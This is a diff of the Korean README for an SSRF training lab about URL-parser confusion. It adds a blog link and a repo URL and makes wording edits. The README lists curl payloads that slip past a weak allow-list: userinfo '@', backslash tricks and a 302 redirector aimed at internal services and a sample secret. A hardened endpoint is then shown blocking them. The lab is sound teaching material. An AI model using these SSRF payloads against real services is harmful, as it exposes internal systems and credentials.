@@ -1,7 +1,7 @@
 # ssrf-url-parser-confusion
 
 > 블로그 글 실습 환경 레포지토리  
-> 관련 글 → [블로그 링크]
+> 관련 글 → [7rueb1rd.tistory.com](https://7rueb1rd.tistory.com/44)
 
 ---
 
@@ -32,8 +32,8 @@
 
 ```bash
 # 1. 레포 클론
-git clone https://github.com/yourname/ssrf-url-parser-confusion.git
-cd ssrf-url-parser-confusion
+git clone https://github.com/Truebird0109/sec-lab.git
+cd sec-lab/ssrf-url-parser-confusion
 
 # 2. 빌드 & 실행
 docker compose up -d --build
@@ -85,33 +85,33 @@ curl "http://localhost:5000/fetch-weak?url=http://evil.com/"
 curl "http://localhost:5000/fetch-weak?url=https://images.example.com/"
 ```
 
-### 실습 1 — `@` 유저인포 파서 컨퓨전
+### 실습 1 — `@` (유저인포) Parser Confusion
 
 ```bash
 # WAF는 netloc에서 images.example.com을 보고 통과시키지만
-# requests는 @ 뒤인 localhost:5000으로 접속
+# requests는 @ 뒤인 localhost:5000으로 접속합니다
 curl "http://localhost:5000/fetch-weak?url=https://images.example.com@localhost:5000/internal-secret"
 
 # 예상 결과:
 # {"status": 200, "body": "{\"aws_access_key\": \"AKIAIOSFODNN7EXAMPLE\", ...}"}
 ```
 
-### 실습 2 — 백슬래시(`\`) 파서 컨퓨전
+### 실습 2 — 백슬래시(`\`) Parser Confusion
 
 ```bash
-# urlparse는 netloc에 images.example.com\localhost:5000 전체를 담음
-# urllib3는 백슬래시 앞 images.example.com 으로만 접속 시도
-# (이 경우 실제 DNS가 없어 오류 — 실제 환경에서는 내 서버 도메인 사용)
+# urlparse는 netloc에 images.example.com\localhost:5000 전체를 담지만
+# urllib3는 백슬래시 앞 images.example.com 으로만 접속을 시도합니다
+# (실제 DNS가 없어 오류 — 실전에서는 내 서버 도메인을 사용합니다)
 curl "http://localhost:5000/fetch-weak?url=https://images.example.com\\localhost:5000/internal-secret"
 ```
 
 ### 실습 3 — 302 리다이렉트 우회
 
 ```bash
-# attacker-redirector(9000)는 302로 internal-api(8080)로 리다이렉트
-# target이 리다이렉트를 자동으로 따라가면서 내부 서비스 데이터를 반환
+# attacker-redirector(9000)는 302로 internal-api(8080)로 리다이렉트합니다
+# target이 리다이렉트를 자동으로 따라가면서 내부 서비스 데이터를 반환합니다
 
-# 먼저 리다이렉터 동작 확인
+# 리다이렉터 동작 확인
 curl -v http://localhost:9000/
 # → HTTP/1.0 302  Location: http://internal-api:8080/
 
@@ -126,7 +126,7 @@ curl "http://localhost:5000/fetch-weak?url=https://images.example.com@localhost:
 
 ```bash
 # /fetch-strong 은 hostname 기반 검증 + allow_redirects=False
-# 같은 페이로드를 넣어도 차단됨
+# 같은 페이로드를 넣어도 차단됩니다
 curl "http://localhost:5000/fetch-strong?url=https://images.example.com@localhost:5000/internal-secret"
 # 예상 결과: {"error": "Blocked by WAF"}
 ```
@@ -143,5 +143,5 @@ docker compose down
 
 ## 주의사항
 
-이 레포의 모든 코드는 **로컬 실습 전용**이다.  
-허가받지 않은 외부 시스템에 사용하는 것은 불법이며, 모든 책임은 사용자에게 있다.
+이 레포의 모든 코드는 **로컬 실습 전용**입니다.  
+허가받지 않은 외부 시스템에 사용하는 것은 불법이며, 모든 책임은 사용자에게 있습니다.
